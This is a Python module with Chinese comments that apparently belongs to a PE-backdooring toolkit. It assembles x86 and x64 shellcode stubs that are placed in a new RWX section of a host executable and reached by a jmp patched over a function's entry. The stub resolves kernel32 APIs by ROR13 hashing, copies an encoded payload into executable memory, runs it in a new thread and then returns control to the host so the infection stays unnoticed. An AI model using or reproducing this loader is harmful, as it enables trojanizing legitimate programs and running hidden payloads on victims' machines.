# -*- coding: utf-8 -*-
"""
asm_loader.py —— 位置无关汇编 loader（M2 核心，x86/x64，新增节模式）

设计（重构自失败的"全内联"方案——内联 blob 会覆盖宿主函数 blob_len 字节，
尾部无法自愈，宿主必崩；新增节方案入口只需 5 字节 jmp，宿主零破坏）：

  PE 新增 .bspy 节（RWX）：[ orig(被位移的入口前 N 字节) ][ body ][ epilogue(静态 jmp 回宿主) ]
  函数入口处：[ jmp rel32 → 节基址 ]（5 字节，N ≥ 5）

  运行流程：
  1. 入口 jmp → 节内 orig：原函数前 N 字节在新节原样执行（safe_split 已保证
     无控制流、无 RIP 相对寻址，位移安全）
  2. body：PEB → Ldr → InMemoryOrderModuleList ROR13 找 kernel32 →
     导出表解析 VirtualAlloc / CreateThread
  3. VirtualAlloc RWX → 拷贝 payload（sgn 自解码需可写内存）→ CreateThread
  4. epilogue：恢复寄存器，静态 jmp 回 入口+N —— 宿主函数完整保留
"""
import keystone as keystone_mod
import capstone

KS_ARCH = {64: (keystone_mod.KS_ARCH_X86, keystone_mod.KS_MODE_64),
           32: (keystone_mod.KS_ARCH_X86, keystone_mod.KS_MODE_32)}
CS_ARCH = {64: (capstone.CS_ARCH_X86, capstone.CS_MODE_64),
           32: (capstone.CS_ARCH_X86, capstone.CS_MODE_32)}

# orig 最小位移字节数 = jmp rel32 长度
JMP_LEN = 5


def ror13_hash(name):
    """与汇编内哈希例程逐字节一致：h = ror13(h) + tolower(c)"""
    h = 0
    for ch in name.lower().encode("ascii"):
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
        h = (h + ch) & 0xFFFFFFFF
    return h


def _ks(arch, asm_text, addr=0):
    # keystone 不接受非 ASCII（含注释），先剥离 ; 注释与空行
    lines = []
    for ln in asm_text.splitlines():
        ln = ln.split(";", 1)[0].strip()
        if ln:
            lines.append(ln)
    clean = "\n".join(lines)
    ks = keystone_mod.Ks(*KS_ARCH[arch])
    out, _ = ks.asm(clean, addr=addr)
    if out is None:
        raise RuntimeError(f"keystone 汇编失败:\n{clean[:400]}")
    return bytes(out)


# ---------------------------------------------------------------- x64 模板
X64_PUSH_SEQ = """
    push r15
    push r14
    push r13
    push r12
    push rbx
    push rbp
    push rsi
    push rdi
    push rax
"""

# 占位符：{PAYLOAD_LEN} {TOTAL_RWX} {D_PAYLOAD} {H_*}
X64_BODY = X64_PUSH_SEQ + """
    call l_anchor
l_anchor:
    pop rbp
    ; ---- PEB 找 kernel32 ----
    mov rax, gs:[0x60]
    mov rax, [rax+0x18]
    mov rax, [rax+0x20]
l_k32_walk:
    mov rax, [rax]
    mov rcx, [rax+0x50]
    test rcx, rcx
    jz l_k32_walk
    xor r13d, r13d
l_k32_hash:
    movzx edx, word ptr [rcx]
    test dx, dx
    jz l_k32_done
    or dl, 0x20
    ror r13d, 13
    add r13d, edx
    add rcx, 2
    jmp l_k32_hash
l_k32_done:
    cmp r13d, {H_K32}
    jne l_k32_walk
    mov rbx, [rax+0x20]
    ; ---- 解析 VirtualAlloc / CreateThread / WaitForSingleObject ----
    mov edx, {H_VA}
    call l_resolve
    mov r12, rax
    mov edx, {H_CT}
    call l_resolve
    mov r13, rax
    mov edx, {H_WSO}
    call l_resolve
    mov r14, rax
    ; ---- VirtualAlloc(NULL, TOTAL, 0x3000, PAGE_RWX) ----
    xor ecx, ecx
    mov edx, {TOTAL_RWX}
    mov r8d, 0x3000
    mov r9d, 0x40
    sub rsp, 0x30
    call r12
    add rsp, 0x30
    mov r11, rax
    ; ---- 拷贝 payload → rwx ----
    mov rdi, r11
    lea rsi, [rbp+{D_PAYLOAD}]
    mov ecx, {PAYLOAD_LEN}
    rep movsb
    ; ---- CreateThread(NULL,0,rwx,NULL,0,NULL) ----
    xor ecx, ecx
    xor edx, edx
    mov r8, r11
    xor r9d, r9d
    sub rsp, 0x40
    mov qword ptr [rsp+0x20], 0
    mov qword ptr [rsp+0x28], 0
    call r13
    add rsp, 0x40
    ; ---- WaitForSingleObject(handle, 10000ms)：宿主等 payload 完成，避免
    ;      ExitProcess 抢先杀线程（快速退出的宿主必须同步）----
    mov rcx, rax
    mov edx, 0x2710
    sub rsp, 0x30
    call r14
    add rsp, 0x30
    ; ---- 收尾：恢复现场（含 rax 占位）----
    pop rax
    pop rdi
    pop rsi
    pop rbp
    pop rbx
    pop r12
    pop r13
    pop r14
    pop r15
    jmp {BACK_ADDR}
    ; ---- 导出表解析子程序: 入参 rbx=模块基址 edx=哈希, 出参 rax ----
l_resolve:
    mov r8d, [rbx+0x3C]
    mov r8d, [rbx+r8+0x88]
    add r8, rbx
    mov r9d, [r8+0x18]
    mov r10d, [r8+0x20]
    add r10, rbx
    mov r11d, [r8+0x24]
    add r11, rbx
l_res_scan:
    mov eax, [r10+r9*4-4]
    add rax, rbx
    xor r11d, r11d
l_res_hash:
    movzx ecx, byte ptr [rax]
    test cl, cl
    jz l_res_cmp
    cmp cl, 'A'
    jb l_res_skip
    cmp cl, 'Z'
    ja l_res_skip
    or cl, 0x20
l_res_skip:
    ror r11d, 13
    add r11d, ecx
    inc rax
    jmp l_res_hash
l_res_cmp:
    cmp r11d, edx
    je l_res_hit
    dec r9
    jnz l_res_scan
    xor eax, eax
    ret
l_res_hit:
    mov r11d, [r8+0x24]
    add r11, rbx
    movzx eax, word ptr [r11+r9*2-2]
    mov edx, [r8+0x1C]
    add rdx, rbx
    mov eax, [rdx+rax*4]
    add rax, rbx
    ret
"""

# ---------------------------------------------------------------- x86 模板
X86_PUSH_SEQ = "pushad\n"

X86_BODY = X86_PUSH_SEQ + """
    call l_anchor
l_anchor:
    pop ebp
    ; ---- PEB 找 kernel32 ----
    mov eax, fs:[0x30]
    mov eax, [eax+0x0C]
    mov eax, [eax+0x14]
l_k32_walk:
    mov eax, [eax]
    mov ecx, [eax+0x28]
    test ecx, ecx
    jz l_k32_walk
    xor edx, edx
l_k32_hash:
    movzx esi, word ptr [ecx]
    test si, si
    jz l_k32_done
    or esi, 0x20
    ror edx, 13
    add edx, esi
    add ecx, 2
    jmp l_k32_hash
l_k32_done:
    cmp edx, {H_K32}
    jne l_k32_walk
    mov ebx, [eax+0x10]
    ; ---- VirtualAlloc：压参数 → 解析 → 直接 call eax（stdcall 自动清参）----
    ; 注意：ebx 在整个调用段保持 kernel32 基址（l_resolve 的入参），rwx 走 edi
    push 0x40
    push 0x3000
    push {TOTAL_RWX}
    push 0
    mov edx, {H_VA}
    call l_resolve
    call eax              ; esp=B；eax=rwx
    push eax              ; 暂存 rwx @ [B-4]
    ; ---- 拷贝 payload → rwx（edi=目标，rep movsb 会推进 edi）----
    mov edi, eax
    lea esi, [ebp+{D_PAYLOAD}]
    mov ecx, {PAYLOAD_LEN}
    rep movsb
    mov edi, [esp]        ; 从暂存恢复 rwx（ebx 仍是 k32 基址）
    ; ---- CreateThread：stdcall 从右往左压栈（B-28）→ 解析 → call eax ----
    push 0                ; arg6 lpThreadId
    push 0                ; arg5 dwCreationFlags
    push 0                ; arg4 lpParameter
    push edi              ; arg3 lpStartAddress = rwx
    push 0                ; arg2 dwStackSize
    push 0                ; arg1 lpThreadAttributes
    mov edx, {H_CT}
    call l_resolve
    call eax              ; stdcall 清 6 参 → esp=B-4；eax=handle
    ; ---- WaitForSingleObject(handle, 10000ms) ----
    push eax              ; 暂存 handle @ [B-8]
    push 0x2710           ; arg2
    push [esp+4]          ; arg1 = handle
    mov edx, {H_WSO}
    call l_resolve
    call eax              ; stdcall 清 2 参 → esp=B-8
    add esp, 8            ; 丢弃 handle/rwx 暂存 → esp=B
    popad
    jmp {BACK_ADDR}
    ; ---- 解析子程序 ----
    ; 入参 ebx=模块基址 edx=目标哈希，出参 eax=函数地址
    ; 注：keystone x86 不支持三项寻址(base+idx*scale+disp)，全部拆为两分量
l_resolve:
    push edi
    push esi
    push ebx
    mov edi, ebx
    mov esi, edx
    mov eax, [edi+0x3C]
    mov eax, [edi+eax+0x78]
    add eax, edi
    mov ecx, [eax+0x18]
    mov edx, [eax+0x20]
    add edx, edi
l_res_scan:
    push eax
    push edx
    push ecx
    mov eax, ecx
    dec eax
    mov eax, [edx+eax*4]
    add eax, edi
    xor ebx, ebx
l_res_hash:
    movzx edx, byte ptr [eax]
    test dl, dl
    jz l_res_cmp
    cmp dl, 'A'
    jb l_res_skip
    cmp dl, 'Z'
    ja l_res_skip
    or dl, 0x20
l_res_skip:
    ror ebx, 13
    add ebx, edx
    inc eax
    jmp l_res_hash
l_res_cmp:
    cmp ebx, esi
    pop ecx
    pop edx
    pop eax
    je l_res_hit
    dec ecx
    jnz l_res_scan
    xor eax, eax
    jmp l_res_out
l_res_hit:
    mov esi, eax
    mov edx, [esi+0x24]
    add edx, edi
    mov eax, ecx
    dec eax
    add eax, eax
    movzx edx, word ptr [edx+eax]
    mov eax, [esi+0x1C]
    add eax, edi
    shl edx, 2
    mov eax, [eax+edx]
    add eax, edi
l_res_out:
    pop ebx
    pop esi
    pop edi
    ret
"""

TEMPLATES = {64: (X64_BODY, X64_PUSH_SEQ), 32: (X86_BODY, X86_PUSH_SEQ)}


def build_section_stub(arch, orig_bytes, payload, section_rva, back_rva):
    """
    组装新增节内容: [orig][body]。
    :param arch: 32 / 64
    :param orig_bytes: 被位移的原函数前 N 字节（N ≥ JMP_LEN，capstone 安全切分）
    :param payload: sgn 编码后的 shellcode
    :param section_rva: 新节 RVA（orig 装载地址 = section_rva）
    :param back_rva: 返回地址 = 入口 RVA + N
    :return: (stub: bytes, meta: dict)
    """
    payload_len = len(payload)
    orig_len = len(orig_bytes)
    if orig_len < JMP_LEN:
        raise RuntimeError(f"orig 位移长度 {orig_len} < jmp rel32 长度 {JMP_LEN}")

    # 锚点偏移 RBIP：orig + push 序列 + call(5)（pop 指令位于 RBIP，其值即 RBIP）
    push_seq = _ks(arch, TEMPLATES[arch][1])
    rbip = orig_len + len(push_seq) + 5

    # 不动点迭代：编码长度依赖字段值（<0x80 → 短编码），字段值又依赖长度
    def hx(v):
        return f"0x{v:08x}"

    back_addr = f"0x{back_rva:08x}"
    fmt = dict(H_K32=hx(ror13_hash("kernel32.dll")),
               H_VA=hx(ror13_hash("VirtualAlloc")),
               H_CT=hx(ror13_hash("CreateThread")),
               H_WSO=hx(ror13_hash("WaitForSingleObject")),
               PAYLOAD_LEN=payload_len, TOTAL_RWX=0x11111111,
               D_PAYLOAD=0x11111111, BACK_ADDR=back_addr)
    stub_len = None
    for _ in range(6):
        body = _ks(arch, TEMPLATES[arch][0].format(**fmt), addr=section_rva + orig_len)
        if len(body) == stub_len:
            break
        stub_len = len(body)
        # D_PAYLOAD 相对 rbp（节内锚点）：payload 位于节内 orig_len+stub_len 处，
        # rbp = 节内 rbip 处 → 位移 = (orig_len+stub_len) - rbip（与 section_rva 无关！）
        fmt.update(TOTAL_RWX=payload_len,
                   D_PAYLOAD=(orig_len + stub_len) - rbip)
    else:
        raise RuntimeError("两遍汇编未收敛")

    # 终版校验：长度不变
    body2 = _ks(arch, TEMPLATES[arch][0].format(**fmt), addr=section_rva + orig_len)
    if len(body2) != stub_len:
        raise RuntimeError(f"两遍长度不一致: {len(body2)} != {stub_len}")

    stub = orig_bytes + body2
    # 锚点自检：pop rbp/ebp（0x5D）应恰在 RBIP 处
    if stub[rbip] != 0x5D:
        raise RuntimeError(f"锚点校验失败: stub[{rbip}]={stub[rbip]:#x} != pop(0x5D)")
    verify_stub(arch, stub, rbip, orig_len, stub_len)

    meta = {
        "arch": arch, "rbip": rbip, "orig_len": orig_len, "body_len": stub_len,
        "stub_len": len(stub), "payload_len": payload_len,
        "total_rwx": payload_len,
        "section_rva": section_rva, "back_rva": back_rva,
        "hash_kernel32": ror13_hash("kernel32.dll"),
        "hash_virtualalloc": ror13_hash("VirtualAlloc"),
        "hash_createthread": ror13_hash("CreateThread"),
        "hash_waitforsingleobject": ror13_hash("WaitForSingleObject"),
        "stub_hex": stub.hex(),
    }
    return stub, meta


def verify_stub(arch, stub, rbip, orig_len, body_len):
    """capstone 反汇编回读：orig 段 + body 段必须全部是有效指令"""
    md = capstone.Cs(*CS_ARCH[arch])
    md.detail = True
    count = 0
    for _ in md.disasm(stub[orig_len:orig_len + body_len], 0x100000 + orig_len):
        count += 1
    if count < 20:
        raise RuntimeError(f"body 反汇编指令数异常: {count}")
    return True


def make_jmp_patch(from_rva, to_rva):
    """E9 rel32：从 from_rva 跳到 to_rva（rel 以 from_rva+5 为基准）"""
    rel = (to_rva - (from_rva + JMP_LEN)) & 0xFFFFFFFF
    if rel >= 0x80000000:
        rel -= 0x100000000
    if not (-0x80000000 <= rel <= 0x7FFFFFFF):
        raise RuntimeError("jmp rel32 超出 ±2GB")
    return b"\xE9" + (rel & 0xFFFFFFFF).to_bytes(4, "little")


if __name__ == "__main__":
    import sys
    arch = int(sys.argv[1]) if len(sys.argv) > 1 else 64
    orig = b"\x90" * 8
    payload = b"\xcc" * 64
    stub, meta = build_section_stub(arch, orig, payload, 0x45000, 0x1308)
    print(f"[+] arch={arch} stub={len(stub)}B body={meta['body_len']} rbip={meta['rbip']}")
    print(f"    jmp: {make_jmp_patch(0x1300, 0x1308).hex()}")
    md = capstone.Cs(*CS_ARCH[arch])
    for ins in list(md.disasm(stub[meta['orig_len']:], 0x45000 + meta['orig_len']))[:16]:
        print(f"    {ins.address:#08x}  {ins.mnemonic} {ins.op_str}")
    print("    ...")
